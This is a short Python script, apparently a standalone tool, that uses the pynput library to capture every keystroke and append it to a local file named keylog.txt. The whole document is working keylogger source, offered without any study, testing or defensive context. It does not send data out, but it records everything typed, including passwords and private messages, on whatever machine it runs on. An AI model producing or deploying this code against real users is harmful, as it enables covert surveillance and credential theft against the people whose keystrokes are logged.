from pynput import keyboard

log_file = "keylog.txt"  # Output file

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# Start listening
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
